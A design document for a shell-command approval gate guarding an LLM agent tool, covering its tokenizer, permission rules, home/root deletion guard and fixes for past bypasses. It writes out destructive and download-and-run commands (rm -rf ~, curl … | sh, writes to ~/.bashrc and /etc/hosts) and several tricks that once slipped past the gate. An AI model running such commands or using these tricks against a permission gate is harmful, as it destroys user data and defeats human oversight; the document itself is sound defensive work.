# Agentic Shell Validation — High Design & Deep Dive

Status: implemented (`ollamaquery2.py:1862`, stdlib-only, single-file)
Prototypes evaluated: `ollamaquery_SHELL_PERMISSION_TODO/shell_permission_parser.py`
(18 tests) + `hermes_style_approval.py` (31 tests)
Comparison: `ollamaquery_SHELL_PERMISSION_TODO/comparison_shell_permission.md`

---

## 1. High Design

### 1.1 Problem

`ollamaquery2.py` executes shell commands in two places:

| Call site                        | Entry point                         | Previous gate                          |
|----------------------------------|-------------------------------------|----------------------------------------|
| `Executor._run_shell:2471`       | `run_command` / `run_python` tools  | `validate_shell_command_safety` + `shell=False` + `shlex.split` (validators since removed) |
| `execute_os_command:4331`        | `!` inline shell (`_process_command_lines:4284`) | same gate |

The gate rejected any command containing `|  &&  ||  ;  >  <  ` `$(` `` ` ``
`ollamaquery2.py:719,766`, so legitimate composition (`cat file | grep foo`,
`echo hi > out`) was impossible. The tool description for `run_command`
(`AGENTIC_TOOL_DEFS:2589`) promised a *single* command only, contradicting
real usage (`curl -s http://x | head`).

Additional requirement: protect the user's home directory (`~/`, `$HOME`) from
`rm -rf` without over-blocking the working directory and its subdirectories
where the agent lives.

### 1.2 Global Strategy — Layered Gate

The new gate keeps the `shell=True` execution model (one whole string via
`/bin/bash`) and layers **detection → allow-list → leniency → prompt**:

```
agent command (whole string)
    │
    ▼
┌─────────────────────────────────────────────────────────────────────┐
│  L0  sandbox-skip          Executor.mode is container or bwrap → allow  │
├─────────────────────────────────────────────────────────────────────┤
│  L1  home/root hard-guard   rm with ~/ $HOME /  → deny (immune)     │
├─────────────────────────────────────────────────────────────────────┤
│  L2  opencode breakdown     shell-aware tokenize → per-component     │
│      + wildcard evaluate     allow / ask / deny  (last-match-wins)   │
├─────────────────────────────────────────────────────────────────────┤
│  L3  CWD leniency           ask + all file operands inside CWD → allow│
├─────────────────────────────────────────────────────────────────────┤
│  L4  auto-confirm           ctx.auto_confirm → allow (respects L1/L2 deny)│
├─────────────────────────────────────────────────────────────────────┤
│  L5  interactive prompt     TTY → y/N/s/a/d  (s/a = this session)   │
│      non-TTY               → deny (fail-closed, hint /agentic auto) │
└─────────────────────────────────────────────────────────────────────┘
    │ allow → subprocess.run(shell=True)
    │ deny  → return {stderr: "BLOCKED (rejected): ...", returncode: -1}
```

*Trust model:* **opencode-style allow-list first**, with a **Hermes-style
bypass-immune floor** only for home/root `rm`. Pipes/redirections are
first-class citizens — they are parsed, not banned.

### 1.3 Why This Hybrid

| Property                         | Pure opencode (`shell_permission_parser.py`) | Pure Hermes (`hermes_style_approval.py`) | Chosen hybrid |
|----------------------------------|----------------------------------------------|------------------------------------------|---------------|
| Pipes/redirs (`\|  >  &&`)        | per-component `allow` → silent (`|`)         | never auto-allowlists compound           | per-component `allow` (opencode) |
| Home `rm -rf ~/`                 | needs explicit `rm -rf ~/ * → deny` rule     | bypass-immune `HARDLINE_PATTERNS:184`    | Hermes-style hard guard `L1` |
| CWD leniency (`./sub/file`)      | requires explicit `allow` rules              | no distinction                           | automatic `L3` realpath check |
| Config surface                   | declarative `permission.bash: { "*": "ask"}` | `deny` globs + `allowlist` + `yolo` + modes | minimal: one `DEFAULT_SHELL_PERMISSION:1870` + session `always` |
| Lines inlined                    | ~320                                         | ~380 + config persistence                | ~380 + 2 helpers |

The comparison doc recommends composition `Hermes outer → opencode inner`
(`comparison_shell_permission.md:160`). The chosen hybrid does exactly that
but **keeps only the Hermes home fold + `~/` check** (the most valuable
hard-floor slice) and **adds CWD leniency** — the opposite of Hermes's coarse
block.

---

## 2. Deep Dive — Chosen Strategy

### 2.1 Placement

New section `SHELL APPROVAL GATE (opencode-style)` `ollamaquery2.py:1862`
inserted before `Executor:2433` to keep the single-file `cp/scp && run`
property. No new dependencies (`fnmatch:27`, `unicodedata:28` only).

```
ollamaquery2.py
    ├── IMPORTS  (fnmatch, unicodedata added)
    ├── ... utility / CommandContext ...
    ├── SHELL APPROVAL GATE  ← new (wildcard, arity, tokenizer, breakdown, gate)
    ├── Executor  (now shell=True + gate)
    ├── AGENTIC_TOOL_DEFS / ToolRegistry
    ├── Input Handling (_process_command_lines → execute_os_command)
    └── ChatLoop
```

### 2.2 Core Port — opencode Breakdown

Direct port of `packages/opencode/src/tool/shell.ts` + `permission/*` +
`packages/core/src/util/wildcard.ts` (`opencode_implementation_detail_shell_permission_parser.md:2`).

Pipeline `ollamaquery2.py:2140-2280` (`opencode_implementation_detail_shell_permission_parser.md:81`):

```
raw string
    │ _shell_tokenize:2080  (word / redir / ctrl, quotes + $( ) + ( ) + <( ) as one token, offsets preserved)
    ▼
token stream  ── split at ctrl (| || && ; ;; |& &)
    │ _shell_breakdown:2175  (segments → CommandNode: source + arity_tokens, recurse into nested $( ) ( ) ` ` )
    ▼
CommandNode[]  ── filter CWD-only (cd/chdir/popd/pushd) + empty
    │ arity_prefix + " *"  (always-pattern)
    ▼
_shell_evaluate:2266  (wildcard last-match-wins, default ask)
    │ shell_check_command:2276
    ▼
verdict {effect: allow|ask|deny, patterns, always, details, nodes}
```

Key faithful details:

*   `wildcard_match:1950` — `* → .*`, `? → .`, trailing ` * → ( .*)?` so
    `git status *` matches bare `git status` (`opencode_implementation_detail_shell_permission_parser.md:219`).
*   `BashArity:1970` table 80+ entries + `arity_prefix:1995` longest-prefix wins
    (`git status → git status *`, `npm run dev → npm run dev *`).
*   `CWD exemption:2008` — `cd` etc. emit no pattern.
*   `_shell_arity_tokens:2135` drops redirections and their targets + `2>` fd
    prefix, so `echo hi > out` keeps pattern `echo hi > out` but tokens
    `["echo","hi"]`. Since 2026-11-13 the dropped **write** targets are carried
    on the node (`redirect_targets`) and gated as operands: `echo x >> /etc/hosts`
    and `echo hacked > ~/.bashrc` used to be `allow` because no downstream check
    saw the destination (C2). `/dev/null` and the terminal devices are exempt,
    and the CWD leniency checks the target too.
*   Newlines split commands: `_shell_tokenize` emits a `_SHELL_CTRL` for `\n`
    (`\r\n` as one separator), because `shell=True` treats them as separators
    while the old parser skipped them as whitespace — that let
    `echo hi\nrm -rf ~` inherit the `echo *` allow rule (C1). Heredoc bodies are
    the exception: they are consumed up to the delimiter and emitted as one
    opaque word, with only their `$(...)`/backticks scanned (bash executes
    those), so a `<<'EOF'` script keeps its single-node shape.
*   **Follow-ups of the same family, closed 2026-11-13 (G1–G4).** An adversarial
    pass after `0.4.3` reproduced four residuals against real bash:
    `$HOME`/`${HOME}` were never resolved (`$` bailed out of
    `_shell_operand_realpath`, and the embedded-path regex cannot match the `/`
    after `E`), so `echo hacked > $HOME/.bashrc` and `cat $HOME/.bashrc` reached
    no rule; `\`+newline is a *continuation* that bash deletes entirely, but the
    scanner kept both characters, so `> \<NL>~/.bashrc` and `> ~/\<NL>.bashrc`
    resolved under the CWD; `>&` was excluded from the write set although bash
    accepts `>&file` (it writes the file); and redirect targets were graded with
    `evaluate("read", …)`, so `>> /etc/hosts` was an approvable `ask` instead of
    the `deny` the design promises. Now: the two HOME spellings expand to the home
    directory (whole token and code blob), `\`+newline is dropped before tokenizing
    (outside single quotes), `>&` joins the write set with the fd forms
    (`2>&1`, `>&-`) filtered out, and **targets are graded as writes** while
    operands stay reads. Pinned by
    `tests/test_acl.py::TestShellHomeRefExpansion`,
    `TestShellLineContinuationInWords`, `TestShellFdRedirectTargets` and
    `TestShellRedirectWriteSemantics` (23 tests).
    Conservative over-blocking is deliberate and pinned: a *quoted* `~`/`$HOME`
    (which bash does not expand) still asks.
*   **Unset variables expand like bash (M3, closed 2026-11-22).**
    `_shell_operand_realpath` bailed out on any `$`, so `echo x > $UNSET/tmp/x`
    was `allow` while bash expands the empty variable and writes `/tmp/x`,
    bypassing the temp-root deny; `${UNSET}/etc/hosts` was caught only by
    accident (the `}` slips past the embedded-path lookbehind).
    `_shell_expand_unset_refs` now replaces a **simple** `$NAME`/`${NAME}`
    absent from `os.environ` with the empty string before the scan, and leaves
    a **defined** variable opaque (a path held in `$XDG_CONFIG_HOME` is still
    a documented limit) and `$HOME` to the G1 pass. Single quotes suppress
    expansion, double quotes allow it, and `\$` is literal, so
    `echo x > '$UNSET/tmp/x'` stays a CWD name instead of a false `/tmp`
    deny. `$TMPDIR` is deliberately left to the TMPDIR pass (a context value,
    not an unset variable). A nested `-c` payload keeps its M2 home/root scan;
    its relative ACL paths (and `$UNSET` inside the payload, where the inner
    shell expands it) are H3's job.
    `tests/test_acl.py::TestShellUnsetVarExpansion` (9).
*   **`-c` payloads are gated too (M2, closed 2026-11-19).** The guard used to
    read only the first-level tokens, so `bash -c "rm -rf ~"` was a plain `ask`
    that `auto_confirm` approved while a direct `rm -rf ~` is denied — a hole
    in the "bypass-immune" promise. `_shell_embedded_commands` extracts the
    payload after a `-c`/bundled `-xc` flag for the shell interpreters
    (`sh|bash|dash|zsh|ksh|mksh|ash`, also `busybox sh`) through the wrappers
    (`sudo -u <user>`, `env VAR=x`, `nohup`, `command`, `exec`, `time`, `nice`),
    and for `python -c` the string arguments of `os.system`/`os.popen`/
    `subprocess.*` (`shell=True` or not — the list form does not expand `~`, so
    it is not a home delete). The payload is unquoted once (a double-quoted
    payload also unescapes `\"`), re-tokenized, normalized like the top level
    (`/home/<user>` → `~`), and the recursion is bounded at 6 levels; at the
    limit a conservative text check decides. Recursion terminates on repeated
    `bash -c "bash -c …"`; a 200 KB payload costs ~170 ms.
    `tests/test_acl.py::TestShellDashCDecomposition` (18).
*   Group nodes `( … )`, `$(…)`, `<(…)` contribute no own pattern, only nested
    nodes (`opencode_implementation_detail_shell_permission_parser.md:401`).

### 2.3 Home/Root Hard Guard (Borrowed from Hermes)

Normalization `ollamaquery2.py:1898` is a **subset** of
`hermes_style_approval.py:138` `_normalize_command_for_detection`:

```
strip ANSI  →  strip \x00  →  NFKC  →  \\\n collapse  →  HOME → ~/ fold  →  \x → x  →  ''/"" strip  →  ${IFS}/$IFS → space
```

Home fold `_shell_rewrite_home:1890` (`os.path.expanduser("~") → ~/`) runs at
**detection time** so `rm -rf /home/user/junk` and `rm -rf ~/junk` both
normalize to `~/`. Order matters — line continuations before backslash-strip
(`hermes_implementation_detail_shell_permission_parser.md:78`).

Guard `ollamaquery2.py:5307` `_shell_is_home_destructive`:

*   normalizes the effective command with `_shell_effective_command`
    (`ollamaquery2.py:5563`): leading `VAR=value` assignments, wrappers
    (`sudo`, `doas`, `env`, `nohup`, `command`, `exec`, `time`,
    `timeout <duration>`, `nice`, `stdbuf`, `builtin`, `busybox`), `--`, the
    wrappers' value options, and an absolute path (`/bin/rm` → `rm`). So
    `sudo rm -rf ~`, `env rm -rf /`, `/bin/rm -rf ~` and `FOO=bar rm -rf ~`
    are denied like a bare `rm`, `auto_confirm` included.
*   `rm`: operands are tested with `_shell_path_is_home_or_root` (`:5658`):
    `~`, `$HOME`, `${HOME}`, `/`, `/*`, `//`, and realpaths resolving to `/`
    or the current home (`/tmp/..`, `/home/<user>`).
*   `find`: only the roots before the expression are considered
    (`_shell_find_roots`, `:5704`), so a `*~*` pattern is not mistaken for
    home. A home/root root with `-delete` or a destructive
    `-exec`/`-execdir`/`-ok`/`-okdir` (`rm`, `shred`, `truncate`, `dd`, `mv`,
    `chmod`, `chown`, a shell interpreter, Python, awk/sed/perl/ruby/node/php)
    is denied.
*   `xargs`: a destructive command after a home/root `find` in the same
    command is denied (`find ~ -print0 | xargs -0 rm -rf`).
*   `cd` tracking: a `cd` outside the project into the home tree, `/`, `/tmp`
    or an ancestor of the project, followed by `rm`, a destructive `find` or a
    destructive `xargs`, is denied. `cd / && rm -rf *`, `cd .. && rm -rf *`,
    `cd ~ && rm -rf *`, `cd && rm -rf *` and `cd $HOME && rm -rf notes` are
    hard-denied, `auto_confirm` included. An interpreter that executes code
    (`bash -c`, `python3 -c`, `python3 script.py`, `awk '…'`) is denied too;
    harmless probes (`python3 --version`) are not.
*   anchored via breakdown (not flat regex), so `echo "rm -rf ~"` does not
    trigger — the effective head is `echo`, not `rm`.
*   bypass-immune: evaluated **before** `yolo`/`auto_confirm`/`CWD leniency`
    (`check_shell_approval:6352`). Even `/agentic auto` cannot override it
    (`hermes_implementation_detail_shell_permission_parser.md:48` yolo never
    bypasses hardline).

Only `~/` + `/` are hard-blocked; `rm -rf /tmp/junk` stays `ask` (soft,
promptable) — the tier split `hermes_implementation_detail_shell_permission_parser.md:174`.

The guard also descends into `-c` payloads (M2): `_shell_nested_home_hit` runs
the same effective-command test on each nested command, and a hit returns the
same bypass-immune `BLOCKED (rejected)` verdict naming the nested command.
`bash -c "rm -rf ~"`, `sh -c '…'`, `bash -lc`, `sudo -u root bash -c …`,
`env VAR=x bash -c …`, `busybox sh -c …`, `timeout 10 bash -c …`,
`sudo -n bash -c …`, `env -i bash -c …` and
`python3 -c "os.system('rm -rf ~')"` are all denied; `auto_confirm` cannot
approve any of them.

### 2.4 CWD Leniency

Requirement: *no over-protection on the directory and subdirectory I'm using*
— relative paths inside the project should not prompt.

`ollamaquery2.py:5235` `_shell_all_operands_inside_cwd`:

*   a node with **no operand** earns leniency only when its command word is a
    project path (`./script.sh`, `build/run`, `script.py`); a bare `sh` or
    `bash` no longer passes vacuously, so `curl http://x | sh` asks.
*   `cd`/`pushd` targets are followed: any target outside the project, or
    `~`/`$VAR`/backtick/glob/`-`, disables leniency for the rest of the line.
    `cd / && rm -rf *` and `cd .. && rm -rf *` are **hard-denied** by the cd
    guard (§2.3), not merely asked; `cd build && rm -rf *` stays lenient.
*   wrappers/assignments (`_shell_effective_index > 0`), `xargs` and shell
    `-c` payloads never get leniency: `env sh -c id`, `sudo rm -rf build`,
    `bash -c 'curl … | sh'` ask.
*   for each remaining node, tokens `1:` (skip command name, skip flags `-…`)
    tested via `_shell_path_inside_cwd:5044`.
*   Stripped quotes, `~`/`$HOME` → outside (conservative).
*   `a/b`, `./a`, `../a`, `*`, `file.txt` → `os.path.abspath(os.path.join(cwd, p))` +
    `os.path.realpath` + `commonpath([real_cwd, real_p]) == real_cwd`.
*   Globs (`*`, `?`) check base directory only.
*   write-redirection targets are checked with the same roots (C2/G4) and,
    since Lot A, with the full write policy: `echo x > ../outside` and
    `cd . > ../outside` are denied. An explicit `~`/`$HOME` non-dotfile target
    keeps the historical shell allow; `~/../outside` escapes and is denied;
    home dotfiles still ask.

Effect in `check_shell_approval:6352`:

```
verdict.effect == ask  +  _all_inside_cwd(nodes) == True  →  allow (no prompt)
```

So `rm -rf build`, `bash x.sh`, `cd build && rm -rf *`, `ls | head`,
`echo hi > out.txt`, `cat file | grep foo`, `gcc -o prog prog.c && ./prog`
pass silently when operands are inside `cwd` — the exact use case for agentic
`write_file → run_command → run_python` pipelines. `cat /etc/passwd` (outside)
stays `ask` → `auto_confirm` or prompt.

### 2.5 Gate & Execution

`check_shell_approval:6352` signature
`check_shell_approval(command, ctx, executor_mode) → {approved, effect, message, verdict}`:

1.  `executor_mode` is `container` or `bwrap` → `allow` (the sandbox is the
    boundary: container namespaces/image, or bwrap's mount policy; matches
    `hermes_style_approval.py:619` skip). bwrap was added in 0.5.0: the gate is
    bypassed by design there, and `doc/agentic_bwrap.md` owns that contract.
2.  `norm + shell_check_command` on both forms → home guard → `deny` with
    `BLOCKED (rejected): …` (contains `rejected` for `test_agentic.py:401`
    compat).
3.  `verdict.effect == deny` → `BLOCKED (rejected): denied by permission rules`.
4.  `allow` + `_shell_wrapper_requires_approval` (`:5901`) → `ask`: a wrapper
    with a command (`env sh -c id`, `env bash -c 'curl … | sh'`) is not
    covered by the `env *` allow rule. A bare `env`/`env FOO=1` stays allow.
5.  `allow` → `allow`.
6.  `ask` + CWD leniency → `allow`.
7.  `auto_confirm` (`ctx.auto_confirm`, wired to `/agentic auto`) →
    `allow` (still respects L1/L2 deny).
8.  non-TTY → `deny` with hint `use /agentic auto`.
9.  TTY → prompt `Allow? [y/N/s/a/d]` (`_shell_prompt_approval:6310`); `s`
    appends `patterns` to `_SHELL_SESSION_APPROVED:4295`, `a` additionally
    appends the broader `always` (`arity *`) patterns to the same list. Both
    are session-scoped and nothing is written to disk (unlike opencode's
    `always` session persistence).

Call sites `ollamaquery2.py:6449,8617,15380`:

```python
# Executor._run_shell:6449  (host)
ctx = CommandContext() if CommandContext._initialized else None
res = check_shell_approval(command, ctx=ctx, executor_mode=self.mode)
if not res["approved"]: return {"stderr": res["message"], "returncode": -1}
subprocess.run(command, shell=True, executable="/bin/bash", ...)  # pipes/redirs work

# _tool_handle_run_command:8617  (operator ban removed)
# Gate lives in Executor._run_shell; no duplicate check

# execute_os_command:15380  (! inline)
gate = check_shell_approval(command, ctx=ctx, executor_mode="host")
...
subprocess.run(command, shell=True, executable="/bin/bash", stdout=STDOUT)
```

`shell=True` is safe because the gate, not `shell=False`, is the boundary —
the model both Hermes and opencode v2 use (`ollamaquery2_inline_approval_proposal.md:21`).

### 2.6 Default Permission Config

`DEFAULT_SHELL_PERMISSION:4194` (`bash` only, last-match-wins):

| Pattern                                                                         | Action  | Rationale                                                 |
| ------------------------------------------------------------------------------- | ------- | --------------------------------------------------------- |
| `*`                                                                             | `ask`   | default prompt                                            |
| `git *`, `grep *`, `ls *`, `cat *`, `echo *`, `python3 *`, `gcc *`, `curl *`, … | `allow` | common read/build tools; enables `git status \| grep foo` |
| `rm *`                                                                          | `ask`   | soft guard                                                |
| `rm -rf ~` etc.                                                                 | `deny`  | explicit deny (also covered by hard guard)                |

`env *` is allow-listed, but a wrapper with a command after it is turned into
`ask` by `_shell_wrapper_requires_approval` (`env sh -c id`, `env bash -c …`);
a bare `env`/`env FOO=1` stays allow. `find *`, `tar *` and `git *` remain
broad allow rules: Lot D of `TODO_security.md` tracks the targeted asks for
`find -exec`, `tar --checkpoint-action`, `git -c` and upload `curl`. The hard
guard covers home/root `find`/`xargs`; the rest is consent + audit, not a
sandbox.

Extensible in-code; could be loaded from `~/.ollamaquery.d/shell_permissions.json` later.

### 2.7 Worked Examples (in `cwd = /tmp/ollama_test_cwd`)

| Command                              | Nodes                        | Verdict       | Gate outcome        | Why                 |
| ------------------------------------ | ---------------------------- | ------------- | ------------------- | ------------------- |
| `git status \| grep foo`             | `git status`, `grep foo`     | `allow`       | `allow`             | both `allow` rules  |
| `echo hi > out.txt`                  | `echo hi > out.txt`          | `allow`       | `allow`             | `echo *`            |
| `cat file \| grep hello` (inside)    | `cat file`, `grep hello`     | `ask`→lenient | `allow`             | CWD operands inside |
| `rm /tmp/ollama_test_cwd/x` (inside) | `rm /tmp/…/x`                | `ask`→lenient | `allow`             | CWD leniency        |
| `bash x.sh` (inside)                 | `bash x.sh`                  | `ask`→lenient | `allow`             | project script      |
| `cat /etc/passwd` (outside)          | `cat /etc/passwd`            | `ask`         | `ask` → auto/prompt | outside             |
| `sh`                                 | `sh`                         | `ask`         | `ask`               | no vacuous leniency |
| `curl http://x \| sh`                | `curl …`, `sh`               | `ask`         | `ask`               | `sh` has no operand |
| `bash -c 'curl … \| sh'`             | `bash -c …`                  | `ask`         | `ask`               | shell `-c`          |
| `env sh -c id`                       | `env sh -c id`               | `allow`→`ask` | `ask`               | wrapper prefix      |
| `sudo rm -rf ~`                      | `sudo rm -rf ~` → `rm -rf ~` | `deny`        | `deny` (hard)       | effective head      |
| `rm -rf ~/junk`                      | `rm -rf ~/junk`              | `deny`        | `deny` (hard)       | L1 home guard       |
| `rm -rf /`                           | `rm -rf /`                   | `deny`        | `deny` (hard)       | L1 root guard       |
| `find ~ -delete`                     | `find ~ -delete`             | `deny`        | `deny` (hard)       | find delete         |
| `find ~ -print0 \| xargs -0 rm -rf`  | `find …`, `xargs …`          | `deny`        | `deny` (hard)       | xargs after find    |
| `cd / && rm -rf *`                   | `cd /`, `rm -rf *`           | `deny`        | `deny` (hard)       | cd escapes + delete |
| `cd build && rm -rf *`               | `cd build`, `rm -rf *`       | `ask`→lenient | `allow`             | cd inside           |
| `rm -rf /tmp/junk`                   | `rm -rf /tmp/junk`           | `ask`         | `ask` → yolo/prompt | soft, not hard      |

---

## 3. Notes on Borrowed Designs

### 3.1 From opencode (`shell_permission_parser.py`)

Borrowed verbatim (with `_shell_` prefix):

*   Tokenizer `tokenize → _shell_tokenize` — shell-aware, top-level only,
    control operators inside quotes/parentheses invisible (`opencode_implementation_detail_shell_permission_parser.md:104`).
*   `wildcard_match → _shell_wildcard_match` + trailing ` *` quirk.
*   `BashArity` table + `arity_prefix`.
*   `breakdown` (segments at `ctrl`, `arity_tokens`, recursion into nested
    `$( )` etc., group-node handling).
*   `evaluate` last-match-wins + `check_command` deny > ask > allow.

*Omitted / simplified:*

*   Heredoc body scanning (still recognized as redir).
*   `for`/`case`/`if` compound modelling — split into component nodes
    (covers every real command, `opencode_implementation_detail_shell_permission_parser.md:339`).
*   Assignment-only `VAR=$(date)` extra node — accepted.
*   Config loading from `permission.bash` file — hardcoded `DEFAULT_SHELL_PERMISSION`.

Tests: `shell_permission_parser.py --test` 18 cases reused as mental
oracle for pipe/redir/deny/CWD scenarios.

### 3.2 From Hermes (`hermes_style_approval.py`)

Borrowed **only** the de-obfuscation slice:

*   Normalization order `strip ANSI → NFKC → \\\n → HOME→~/ → \x → '' → ${IFS}`
    (`hermes_implementation_detail_shell_permission_parser.md:78`).
*   Home folding `_rewrite_resolved_user_home` at detection time.
*   Concept of bypass-immune hard floor (but narrowed to `~/` + `/`).

*Omitted / deliberately not borrowed:*

*   Full `HARDLINE_PATTERNS` (mkfs, dd to `/dev/sd`, fork bomb, kill -1, etc.)
    and `DANGEROUS_PATTERNS` (~24) — out of scope; `rm` home/root is the only
    catastrophic floor needed for local agentic use.
*   `mode` (`manual`/`smart`/`off`), `cron_mode`, `deny` globs, `allowlist`
    with compound rejection, `yolo` env var, `approvals.deny`, `command_allowlist`
    persistence (`hermes_implementation_detail_shell_permission_parser.md:52`).
*   `_mark_command_starts` + `_CMDPOS` anchor + `DANGEROUS_PATTERNS` regex set —
    replaced by breakdown + wildcard, which already anchors correctly.
*   Approval UX `[o]nce/[s]ession/[a]lways/[d]eny` timeout + `smart` LLM judge —
    simplified to `[y/N/s/a/d]`; `smart` not needed.
*   Container skip for `docker`/`singularity`/`modal` — kept minimal
    `executor_mode in (container, bwrap) → allow`.
*   Config file `~/.hermes_style_approval.json` — session
    `_SHELL_SESSION_APPROVED` only (no disk persistence yet).

Rationale `comparison_shell_permission.md:7`: Hermes is strongest for
unattended/cron safety; opencode is strongest for interactive granularity.
The local `ollamaquery2.py` agentic use case is interactive, so opencode is
the primary model and Hermes contributes only the normalization + hard-floor
idea.

### 3.3 Why Not Pure `hermes_style_approval.py`

Inlining the full Hermes gate (`ollamaquery2_inline_approval_proposal.md:1`)
would have reused 24 danger patterns, compound rejection, and modes — but would
block `git status | grep foo` from auto-allowlisting and would over-block CWD
relative paths (`rm -rf /tmp/junk` → hard prompt even inside project). The
requirement *no over-protection on CWD* is incompatible with Hermes's coarse
whole-string detection.

### 3.4 Relation to Existing agentic shell safety

Prior behavior (`AGENTS.md`):

*   `validate_shell_command_safety` + `sanitize` (both since removed) blocked
    `| && ; > <` outright — pipes impossible.
*   `Executor._run_shell:2471` `shell=False` + `shlex.split` — single command only.
*   `run_python` bypassed validation via `python3 -c` special case.

New behavior preserves safety via parsing, not banning: `shell=True` is
enabled because the gate decides per-component, matching both opencode and
Hermes v2 models.

---

## 4. Validation

*   Self-test: `python3 -m py_compile ollamaquery2.py` ok.
*   Unit: `python3 -m unittest discover tests -v` → 425 tests, 112 skipped,
    0 failures (was 1: `test_no_bare_urlopen:784` fixed by
    `check_gemini:6941` → `_request_with_retry`; `test_safety_blocklist:401`
    now expects `BLOCKED (rejected)` and passes).
*   Manual (in `cwd`): `echo hello | grep hello` → `0`, `echo hi > out && cat out` → `0`,
    `rm -rf ~/junk` (even with `ctx.auto_confirm=True`) → `BLOCKED`, `rm` inside
    `cwd` → leniency `allow`, `cat /etc/passwd` → `ask` → `auto`/`prompt`.

---

## 5. Future Work

*   Persist `_SHELL_SESSION_APPROVED` `always` patterns to
    `~/.ollamaquery.d/shell_permissions.json` (like `backends.json:6450` MRU).
*   Optional config file `permission.bash` overlay for user rules.
*   Extend hard guard to additional destructive patterns if needed (opt-in).
*   Heredoc body scanning: **done** 2026-11-13, in the other direction — the body
    is treated as data (one opaque word, bash does not execute it) and only its
    `$(...)`/backticks are scanned. Anything more aggressive over-prompts on
    heredoc-written C/shell content.

---

*References: `ollamaquery_SHELL_PERMISSION_TODO/comparison_shell_permission.md`,
`opencode_implementation_detail_shell_permission_parser.md`,
`hermes_implementation_detail_shell_permission_parser.md`,
`ollamaquery2.py:1862-2440`.*
